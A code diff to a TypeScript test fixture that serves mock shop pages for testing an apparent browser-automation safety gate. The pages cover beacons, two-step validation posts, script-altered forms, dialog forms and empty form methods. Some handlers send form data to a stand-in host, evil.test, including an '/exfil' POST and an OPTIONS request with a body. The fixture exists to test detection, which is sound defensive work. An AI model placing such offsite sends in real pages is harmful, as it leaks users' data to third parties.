@@ -85,7 +85,8 @@ export async function startFixture(): Promise<Fixture> {
             `<h1>Scripts</h1>
             <button onclick="fetch('/api/save', { method: 'POST', body: 'from=fetch' })">Fetch post</button>
             <button onclick="const x = new XMLHttpRequest(); x.open('POST', '/api/save'); x.send('from=xhr')">Xhr post</button>
-            <button onclick="navigator.sendBeacon('/api/save', 'from=beacon')">Beacon</button>`,
+            <button onclick="navigator.sendBeacon('/api/save', 'from=beacon')">Beacon</button>
+            <button onclick="fetch('${at('evil.test', '/opt')}', { method: 'OPTIONS', body: 'note=from-options' })">Options body</button>`,
             'Scripts',
           ),
           'text/html; charset=utf-8',
@@ -212,10 +213,31 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
           delayed: `f.onsubmit = (e) => { e.preventDefault(); setTimeout(() => f.submit(), 300); };`,
           blank: `f.target = '_blank';`,
           offsite: `f.onsubmit = (e) => { e.preventDefault(); fetch('${at('evil.test', '/exfil')}', { method: 'POST', body: 'qty=CHANGED' }); };`,
+          // a beacon at the click, then the form after a check of the page.
+          beacon: `f.onsubmit = (e) => { e.preventDefault(); navigator.sendBeacon('/track', 'checkout-click'); setTimeout(() => f.submit(), 300); };`,
+          // a post of the form to a check of the site, which answers after 400 ms, then the order.
+          twostep: `f.onsubmit = async (e) => { e.preventDefault(); const fd = new FormData(f); const ok = await fetch('/api/validate', { method: 'POST', body: fd }); if (ok.ok) fetch('/api/order', { method: 'POST', body: fd }); };`,
+          // a script changes the form at the click, so the gate refuses it, and a beacon leaves at the same moment.
+          changed: `f.querySelector('button').onpointerdown = () => { f.qty.value = '500'; navigator.sendBeacon('/log', 'click'); };`,
         };
         const mode = new URL(path, 'http://x').searchParams.get('mode') ?? 'sync';
         return send(200, html(`<form id="f" action="/order" method="post"><label>Qty <input name="qty" value="1"></label><button>Place order</button></form><script>${handlers[mode]}</script>`, 'Checkout'));
       }
+      case 'shop.test/api/validate':
+        return void setTimeout(() => send(200, '{"ok":true}', 'application/json'), 400);
+      case 'shop.test/dialog':
+        // a cookie notice: a dialog form only closes its dialog.
+        return send(
+          200,
+          html(
+            `<dialog id="d"><form method="dialog"><button value="ok">Accept all</button></form></dialog><p id="s">notice open</p>
+             <script>d.showModal(); d.onclose = () => (s.textContent = 'notice closed: ' + d.returnValue);</script>`,
+            'Notice',
+          ),
+        );
+      case 'shop.test/empty-method':
+        // the browser sends a form with an empty formmethod as a get.
+        return send(200, html('<form action="/find" method="post"><input name="q" aria-label="Word" value="socks"><button formmethod="">Find</button></form>', 'Find'));
       case 'shop.test/freeze':
         // the page hangs a moment after the click, when no step runs.
         return send(200, html('<button onclick="setTimeout(() => { for (;;) {} }, 500)">Freeze</button><p>calm</p>', 'Freeze'));
